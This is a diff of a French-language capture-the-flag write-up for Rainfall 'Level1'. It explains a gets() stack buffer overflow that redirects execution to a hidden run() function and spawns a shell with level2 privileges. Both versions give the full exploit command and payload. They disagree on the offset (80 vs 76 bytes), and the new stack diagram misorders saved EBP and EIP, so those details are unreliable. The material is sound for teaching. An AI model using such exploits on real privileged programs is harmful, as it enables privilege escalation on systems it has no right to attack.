@@ -1,379 +1,424 @@
-# Level1 - Buffer Overflow
+# Level1 - README Pédagogique
 
-## Vue d'ensemble
-
-Level1 introduit le concept de **buffer overflow** classique. Le programme utilise la fonction dangereuse `gets()` qui ne vérifie pas la taille de l'input, permettant d'écraser la stack et de détourner le flux d'exécution vers une fonction cachée.
+## 🎯 Objectif
+Exploiter un **buffer overflow** pour rediriger le flux d'exécution vers une fonction `run()` qui n'est jamais appelée normalement.
 
 ---
 
-## Code source reconstruit
+## 🔍 Reconnaissance
+
+### Permissions du fichier
+```bash
+$ ls -l level1
+-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+    ^
+    └─ Bit SUID actif → s'exécute avec les droits de level2
+```
+
+### Tests comportementaux
+```bash
+$ ./level1
+test
+[rien ne se passe]
+
+$ python -c "print('A' * 100)" | ./level1
+Segmentation fault (core dumped)
+```
+
+**Observation** : Le programme crash avec beaucoup d'input → **buffer overflow détecté**.
+
+---
+
+## 🛠️ Analyse technique
+
+### Code décompilé (Ghidra)
 ```c
-#include <stdio.h>
-#include <stdlib.h>
+void main(void)
+{
+    char buffer[64];
+    gets(buffer);  // ⚠️ Fonction dangereuse, pas de vérification de longueur !
+}
 
 void run(void)
 {
     fwrite("Good... Wait what?\n", 1, 19, stdout);
     system("/bin/sh");
 }
+```
 
-int main(void)
-{
-    char buffer[76];
-    
-    gets(buffer);  // Vulnérabilité : pas de vérification de taille
-    
-    return 0;
+**Observations critiques** :
+1. `gets()` ne vérifie **jamais** la longueur de l'input
+2. La fonction `run()` existe mais n'est **jamais appelée**
+3. `run()` contient un appel à `system("/bin/sh")`
+
+### Analyse GDB
+```bash
+$ gdb level1
+(gdb) info functions
+```
+
+**Résultat** :
+```
+0x08048444  run
+0x08048480  main
+```
+
+**Adresse de `run()`** : `0x08048444`
+
+---
+
+## 💣 Vulnérabilité : Buffer Overflow
+
+### Qu'est-ce qu'un buffer overflow ?
+
+Un **buffer overflow** se produit quand on écrit plus de données qu'un buffer peut en contenir, ce qui écrase les données adjacentes en mémoire.
+
+**Code vulnérable** :
+```c
+char buffer[64];
+gets(buffer);  // ⚠️ Lit TOUT l'input, quelle que soit sa longueur !
+```
+
+**Analogie** : Un verre de 250ml.
+- Tu verses 250ml → OK ✅
+- Tu verses 500ml → Déborde et renverse sur la table 💧
+
+### Comment ça fonctionne ?
+
+#### Structure de la stack (avant overflow)
+```
+Adresses hautes
+┌─────────────────────┐
+│   Saved EBP         │ ← 4 octets
+├─────────────────────┤
+│   Saved EIP         │ ← 4 octets (adresse de retour)
+├─────────────────────┤
+│   Padding           │ ← 8 octets (alignement)
+├─────────────────────┤
+│   buffer[64]        │ ← 64 octets
+└─────────────────────┘
+Adresses basses
+
+Total avant Saved EIP : 64 + 8 + 4 = 76 octets
+```
+
+#### Après le buffer overflow
+```
+┌─────────────────────┐
+│   0x08048444        │ ← ÉCRASÉ par notre adresse (run) ✅
+├─────────────────────┤
+│   AAAA              │ ← ÉCRASÉ (saved EBP, on s'en fout)
+├─────────────────────┤
+│   AAAAAAAA...       │ ← 76 octets de 'A'
+└─────────────────────┘
+```
+
+**Au moment du `ret`** :
+```asm
+ret  # Équivalent à : EIP = pop()
+     # EIP = 0x08048444 (adresse de run)
+     # Le CPU saute vers run() ! ✅
+```
+
+---
+
+## 🔑 Concepts clés
+
+### 1. Le registre EIP (Instruction Pointer)
+
+**EIP** = **Extended Instruction Pointer**
+
+**Rôle** : Contient l'adresse de la **prochaine instruction** à exécuter.
+
+```
+CPU lit l'instruction à l'adresse contenue dans EIP
+→ Exécute l'instruction
+→ Incrémente EIP (ou le modifie avec un jump/call)
+→ Répète
+```
+
+**Pourquoi c'est critique ?**
+- Contrôler EIP = contrôler le flux d'exécution du programme
+- Buffer overflow → écraser la saved return address → contrôler EIP
+
+### 2. La saved return address
+
+Quand une fonction est appelée :
+
+```asm
+call function
+    ↓
+1. Empile l'adresse de retour (saved return address)
+2. Saute vers function
+
+function:
+    # ... code de la fonction ...
+    ret
+    ↓
+3. Dépile la saved return address
+4. Charge cette adresse dans EIP
+5. Continue l'exécution
+```
+
+**Dans un buffer overflow** :
+- On écrase la saved return address sur la stack
+- Au `ret`, le CPU charge NOTRE adresse dans EIP
+- On redirige le programme où on veut ! 🎯
+
+### 3. L'offset
+
+**Offset** = Distance entre le début du buffer et la saved return address.
+
+**Comment le trouver ?**
+
+#### Méthode 1 : Analyse statique (Ghidra)
+```c
+char buffer[64];  // 64 octets
+// + 8 octets de padding (alignement)
+// + 4 octets de saved EBP
+// = 76 octets avant saved EIP
+```
+
+#### Méthode 2 : Pattern cyclique manuel
+
+**Créer un pattern unique** :
+```bash
+# Pattern où chaque groupe de 4 caractères est unique
+# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...
+```
+
+**Tester avec GDB** :
+```bash
+$ gdb level1
+(gdb) run
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+^D
+
+Program received signal SIGSEGV
+(gdb) info registers eip
+eip  0x37634136  # En ASCII : "6Ac7"
+```
+
+**Trouver l'offset** :
+```bash
+# Chercher "6Ac7" dans le pattern
+# Position de "6Ac7" dans le pattern = 76
+
+# Vérification :
+(gdb) run
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
+^D
+(gdb) info registers eip
+eip  0x42424242  # "BBBB" → confirme offset = 76
+```
+
+### 4. Little-endian
+
+**Définition** : Convention de stockage des octets en mémoire (octet de poids **faible** en premier).
+
+**Exemple** :
+```
+Adresse : 0x08048444
+
+En little-endian :
+  Octet 1 : 0x44 (poids faible)
+  Octet 2 : 0x84
+  Octet 3 : 0x04
+  Octet 4 : 0x08 (poids fort)
+
+Représentation : \x44\x84\x04\x08
+```
+
+**Conversion rapide** :
+```
+0x08048444
+  08 04 84 44  (paires d'octets)
+  44 84 04 08  (inversé) → \x44\x84\x04\x08
+```
+
+**Pourquoi x86 utilise le little-endian ?**
+- Héritage historique Intel 8080
+- Simplifie l'arithmétique multi-octets
+- Rétrocompatibilité depuis 40+ ans
+
+### 5. La fonction gets()
+
+**Prototype** :
+```c
+char *gets(char *str);
+```
+
+**Problème** : Ne vérifie **JAMAIS** la longueur de l'input.
+
+```c
+char buffer[10];
+gets(buffer);  // Si l'utilisateur tape 100 caractères → BOOM 💥
+```
+
+**gets() est deprecated et INTERDITE** dans tout code moderne !
+
+**Alternative sécurisée** :
+```c
+char buffer[64];
+fgets(buffer, sizeof(buffer), stdin);  // Limite à 64 octets ✅
+```
+
+### 6. Dead code (code mort)
+
+**Définition** : Code présent dans le binaire mais jamais exécuté normalement.
+
+**Dans Level1** :
+```c
+void run(void) {  // ← Fonction jamais appelée
+    system("/bin/sh");
 }
 ```
 
----
+**Pourquoi c'est exploitable ?**
+- Le code existe en mémoire
+- On peut rediriger EIP vers son adresse
+- Le programme l'exécute comme si elle avait été appelée normalement
 
-## La vulnérabilité : gets()
+### 7. Le trick du `cat`
 
-### Pourquoi `gets()` est dangereux
-```c
-char buffer[76];
-gets(buffer);  // ❌ Aucune limite de taille
-```
+**Problème** : Le shell se ferme immédiatement après l'exploit.
 
-La fonction `gets()` :
-- Lit depuis stdin jusqu'à `\n` ou EOF
-- **N'impose aucune limite** de taille
-- Écrit directement en mémoire sans vérification
-- Officiellement **deprecated** depuis C11 (2011)
-
-### Alternative sécurisée
-```c
-char buffer[76];
-fgets(buffer, sizeof(buffer), stdin);  // ✅ Limite à 76 octets
-```
-
----
-
-## Structure de la stack
-
-### Organisation mémoire lors de l'appel à main
-```
-Adresses hautes
-┌─────────────────────────┐
-│  Arguments (argc, argv) │
-├─────────────────────────┤
-│  Adresse de retour (EIP)│  ← Cible : contrôler cette adresse (4 octets)
-├─────────────────────────┤
-│  EBP sauvegardé         │  ← Base pointer de la frame précédente (4 octets)
-├─────────────────────────┤
-│  buffer[76]             │  ← Notre buffer local (76 octets)
-└─────────────────────────┘
-Adresses basses (ESP)
-```
-
-### Calcul de l'offset
-
-Pour atteindre l'adresse de retour (EIP) depuis le début du buffer :
-- **Buffer** : 76 octets
-- **EBP sauvegardé** : 4 octets
-- **Total** : **80 octets**
-
-Notre payload :
-```
-[80 octets de padding] + [adresse de destination]
-```
-
----
-
-## Concepts clés
-
-### Buffer Overflow
-
-**Définition :** Écriture au-delà des limites d'un buffer alloué, permettant d'écraser des données adjacentes en mémoire (variables locales, adresses de retour, pointeurs).
-
-**Conséquence :** Contrôle du flux d'exécution en écrasant l'adresse de retour.
-
-### EIP (Extended Instruction Pointer)
-
-**Rôle :** Registre CPU contenant l'adresse de la **prochaine instruction** à exécuter.
-
-**Exploitation :** En écrasant l'adresse de retour sur la stack, on contrôle la valeur d'EIP lors du `return`, redirigeant l'exécution vers l'adresse de notre choix.
-
-### Fonction cachée
-
-Une fonction présente dans le binaire mais **jamais appelée** dans le flux normal d'exécution. Dans un contexte CTF, c'est souvent une "backdoor" intentionnelle.
-
-Ici, la fonction `run()` :
-- Existe dans le binaire
-- N'est jamais appelée par `main`
-- Contient `system("/bin/sh")` qui nous donne un shell
-
-### Bit SUID (Set User ID)
-
-**Permission spéciale** qui fait qu'un binaire s'exécute avec les privilèges de son **propriétaire** plutôt que ceux de l'utilisateur qui le lance.
-
-**Identification :**
 ```bash
--rwsr-s---+ 1 level2 users  5138  level1
-   ^
-   └─ 's' au lieu de 'x' = bit SUID activé
+$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
+# /bin/sh se lance mais stdin est fermé (EOF)
+# → Le shell se termine immédiatement ❌
 ```
 
-**Conséquence :** Le shell lancé par `system("/bin/sh")` hérite des privilèges de `level2`.
+**Solution** : Utiliser `cat` pour garder stdin ouvert.
 
----
-
-## Architecture x86 : Little-endian
-
-### Ordre des octets en mémoire
-
-En architecture x86, les valeurs multi-octets sont stockées en **little-endian** : l'octet de poids **faible** est stocké en **premier**.
-
-**Exemple :**
-
-L'adresse `0x08048444` doit être écrite en mémoire comme :
-```
-\x44\x84\x04\x08
-```
-
-**Visualisation :**
-```
-Adresse mémoire:  [0x100] [0x101] [0x102] [0x103]
-Contenu:            0x44    0x84    0x04    0x08
-                    ^^^^                    ^^^^
-                poids faible            poids fort
-```
-
-### Pourquoi little-endian ?
-
-Raisons historiques (architecture Intel) :
-- Simplifie les opérations arithmétiques sur des valeurs de tailles variables
-- Permet de lire un `short` (2 octets) ou un `int` (4 octets) à partir de la même adresse
-
----
-
-## Scénarios d'exécution
-
-### Scénario normal (sans overflow)
-```c
-char buffer[76];
-gets(buffer);  // User entre "hello"
-return;        // Retourne à l'appelant de main
-```
-
-**Stack :**
-```
-┌──────────────┐
-│ 0x080484a0   │  ← Adresse de retour normale (vers _start ou __libc_start_main)
-├──────────────┤
-│ 0xbffff7d8   │  ← EBP sauvegardé
-├──────────────┤
-│ "hello\0..." │  ← buffer[76]
-└──────────────┘
-```
-
-Le `return` charge `0x080484a0` dans EIP → exécution continue normalement.
-
----
-
-### Scénario avec buffer overflow
-```c
-char buffer[76];
-gets(buffer);  // User entre 80 'A' + adresse de run()
-return;        // Retourne vers run() !
-```
-
-**Stack après overflow :**
-```
-┌──────────────┐
-│ 0x08048444   │  ← Adresse écrasée (pointe vers run)
-├──────────────┤
-│ 0x41414141   │  ← EBP écrasé par 'AAAA'
-├──────────────┤
-│ AAAA...AAAA  │  ← buffer rempli de 76 'A'
-└──────────────┘
-```
-
-Le `return` charge maintenant `0x08048444` dans EIP → saut vers `run()` !
-
----
-
-## Construction du payload
-
-### Étape 1 : Padding de 80 octets
-
-Remplir le buffer (76 octets) + EBP sauvegardé (4 octets) :
-```
-'A' × 80
-```
-
-### Étape 2 : Adresse de run en little-endian
-
-Adresse : `0x08048444`  
-Format little-endian : `\x44\x84\x04\x08`
-
-### Étape 3 : Assemblage
 ```bash
-printf 'AAAA...AAAA\x44\x84\x04\x08'
-        ^^^^^^^^^^^  ^^^^^^^^^^^^^^^^
-        80 octets    Adresse de run
+$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+whoami         # ← Tu tapes ça
+level2         # ← Réponse du shell ✅
 ```
 
-### Étape 4 : Garder stdin ouvert
+**Explication** :
+1. `python -c` envoie le payload → lance /bin/sh
+2. `cat` (sans arguments) lit stdin et l'écrit sur stdout
+3. Tout ce que tu tapes → `cat` → stdin de /bin/sh
+4. Le shell reste ouvert et exécute tes commandes ✅
 
-**Problème :** Le pipe ferme stdin après l'envoi du payload. Le shell reçoit immédiatement EOF et se termine.
+**Visualisation** :
+```
+Clavier → cat → stdin → /bin/sh → stdout → Terminal
+```
 
-**Solution :** Utiliser `cat` pour garder stdin ouvert et permettre l'interaction avec le shell :
+---
+
+## 🚀 Construction du payload
+
+### Structure du payload
+```
+[76 octets de padding] + [Adresse de run en little-endian]
+```
+
+### Calcul détaillé
+```
+Offset = 76 octets (buffer + padding + saved EBP)
+Adresse de run() = 0x08048444
+Little-endian = \x44\x84\x04\x08
+
+Payload final :
+  'A' × 76 + '\x44\x84\x04\x08'
+```
+
+### Commande d'exploitation
+
 ```bash
-(printf '...'; cat) | ./level1
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
 ```
 
 ---
 
-## Pourquoi ça fonctionne ?
+## 🔄 Déroulement de l'exploitation
 
-### 1. Buffer overflow
+### Étape par étape
 
-`gets()` permet d'écrire au-delà des 76 octets du buffer.
+1. **Lancement du programme**
+   ```bash
+   ./level1
+   ```
 
-### 2. Écrasement de l'adresse de retour
+2. **gets() attend l'input**
+   ```c
+   gets(buffer);  // Attend sur stdin
+   ```
 
-En écrivant 80 octets de padding + 4 octets d'adresse, on écrase l'adresse de retour stockée sur la stack.
+3. **On envoie le payload**
+   ```
+   AAAA...AAAA (76 octets) + \x44\x84\x04\x08
+   ```
 
-### 3. Contrôle d'EIP
+4. **Buffer overflow**
+   ```
+   - Les 76 premiers octets remplissent buffer + padding + saved EBP
+   - Les 4 suivants écrasent saved EIP avec 0x08048444
+   ```
 
-Lors du `return` de `main`, le CPU charge notre adresse dans EIP au lieu de l'adresse normale.
+5. **gets() se termine, exécute `ret`**
+   ```asm
+   ret  # EIP = pop() = 0x08048444
+   ```
 
-### 4. Saut vers run()
+6. **Le CPU saute vers run()**
+   ```c
+   void run(void) {
+       fwrite("Good... Wait what?\n", 1, 19, stdout);
+       system("/bin/sh");  // ← On arrive ici ! ✅
+   }
+   ```
 
-Le programme saute vers `run()` qui exécute `system("/bin/sh")`.
-
-### 5. Élévation de privilèges
-
-Le binaire a le bit SUID de `level2`, donc le shell hérite de ces privilèges.
-
----
-
-## Détails techniques
-
-### Pourquoi le segfault avec trop de 'A' ?
-```bash
-python -c "print('A' * 100)" | ./level1
-Segmentation fault
-```
-
-**Explication :**
-1. On écrit 100 'A', dont les 4 derniers écrasent l'adresse de retour
-2. L'adresse de retour devient `0x41414141` (AAAA en ASCII)
-3. Le `return` tente de sauter vers `0x41414141`
-4. Cette adresse n'existe pas ou n'est pas mappée → **Segmentation fault**
-
-### Comment trouver l'offset exact ?
-
-**Méthode incrémentale :**
-
-Tester avec des marqueurs uniques :
-```gdb
-(gdb) run
-AAAA...AAAABBBB
-^D
-```
-
-Si EIP = `0x42424242` (BBBB), on sait que les 4 'B' ont écrasé l'adresse de retour, et on calcule l'offset des 'A' précédents.
+7. **Shell obtenu**
+   ```bash
+   $ whoami
+   level2
+   ```
 
 ---
 
-## Protections modernes (absentes ici)
+## 📝 Classification
 
-Ce type d'attaque est aujourd'hui mitigé par plusieurs protections :
-
-### Stack Canaries
-
-Valeur aléatoire placée entre les variables locales et l'adresse de retour. Si elle est modifiée, le programme s'arrête avant le `return`.
-```
-┌──────────────┐
-│ Adresse ret  │
-├──────────────┤
-│ CANARY       │  ← Valeur vérifiée avant return
-├──────────────┤
-│ buffer       │
-└──────────────┘
-```
-
-### DEP/NX (Data Execution Prevention)
-
-Marque certaines zones mémoire (comme la stack) comme **non-exécutables**, empêchant l'exécution de shellcode injecté.
-
-### ASLR (Address Space Layout Randomization)
-
-Randomise les adresses de la stack, heap, et libc à chaque exécution, rendant les adresses fixes inutilisables.
-
-### PIE (Position Independent Executable)
-
-Le code du binaire lui-même est chargé à une adresse aléatoire.
-
-**Dans Rainfall :** Ces protections sont **désactivées** pour faciliter l'apprentissage.
+**Type de vulnérabilité** :
+- **CWE-120** : Buffer Overflow (Classic Buffer Overflow)
+- **CWE-676** : Use of Potentially Dangerous Function (gets)
+- **CWE-250** : Execution with Unnecessary Privileges (SUID)
 
 ---
 
-## Outils utilisés
+## 🎓 Résumé
 
-### GDB (GNU Debugger)
-
-**Commandes essentielles :**
-```gdb
-info functions       # Liste toutes les fonctions
-print run            # Affiche l'adresse de run
-disas main           # Désassemble main
-run                  # Exécute le programme
-info registers       # Affiche les registres (EIP, ESP, etc.)
-x/20wx $esp          # Examine 20 words à partir de ESP
-```
-
-### Ghidra
-
-Décompilateur qui transforme le binaire en pseudo-code C lisible.
-
-**Workflow :**
-1. Importer le binaire
-2. Analyser automatiquement
-3. Explorer les fonctions
-4. Lire le code décompilé
-
-### printf (shell builtin)
-
-**Pourquoi pas `echo` ?**
-```bash
-echo '\x44'      # Affiche littéralement : \x44 (4 caractères)
-printf '\x44'    # Interprète et affiche l'octet 0x44 (1 octet)
-```
-
-`printf` interprète correctement les séquences d'échappement hexadécimales, essentiel pour construire des payloads binaires.
+1. **Vulnérabilité** : `gets()` sans vérification de longueur
+2. **Faille** : Buffer overflow écrase la saved return address
+3. **Exploitation** : Rediriger EIP vers `run()` (0x08048444)
+4. **Technique** : 76 octets de padding + adresse en little-endian
+5. **Résultat** : Shell avec les privilèges de level2
+6. **Trick** : Utiliser `cat` pour garder stdin ouvert
 
 ---
 
-## Résumé de l'exploitation
+## 🔐 Protection (non présente ici)
 
-1. **Vulnérabilité** : `gets()` sans limite de taille
-2. **Découverte** : Fonction cachée `run()` contenant `system("/bin/sh")`
-3. **Offset** : 80 octets pour atteindre l'adresse de retour
-4. **Payload** : 80 octets de padding + adresse de `run()` (little-endian)
-5. **Exploitation** : Buffer overflow → Contrôle d'EIP → Saut vers `run()` → Shell avec privilèges level2
-6. **Récupération** : Lecture du flag dans `/home/user/level2/.pass`
+Dans un système moderne, ces protections empêcheraient l'exploit :
 
----
+1. **Stack Canary** : Valeur aléatoire avant saved EIP, vérifiée avant `ret`
+2. **ASLR** : Randomisation des adresses mémoire
+3. **NX/DEP** : Stack non-exécutable
+4. **RELRO** : Protection des sections mémoire
 
-## Concepts pour la suite
-
-Les prochains niveaux introduiront probablement :
-- **Return-to-libc** : Sauter vers des fonctions de la libc
-- **ROP (Return-Oriented Programming)** : Chaîner des gadgets
-- **Format string attacks** : Exploiter `printf(user_input)`
-- **Heap overflow** : Exploiter des buffers alloués dynamiquement
-- **Bypasser des protections** : Canaries, ASLR, etc.
+**Dans Rainfall** : Toutes ces protections sont **désactivées** pour l'apprentissage.
 
 ---
 
-## Ressources
+## 🎯 Points clés à retenir
 
-- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) - Article fondateur (1996)
-- [Buffer Overflow Attack - OWASP](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
-- [x86 Assembly Guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html)
-- [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
+- **gets() = DANGER** : Toujours utiliser `fgets()` ou `read()` avec limite
+- **EIP contrôle tout** : Contrôler EIP = contrôler le programme
+- **Little-endian** : Inverser l'ordre des octets pour les adresses
+- **Offset = distance** : Du début du buffer à la saved return address
+- **cat trick** : Maintient stdin ouvert pour le shell
+- **Dead code** : Fonctions non appelées mais exploitables
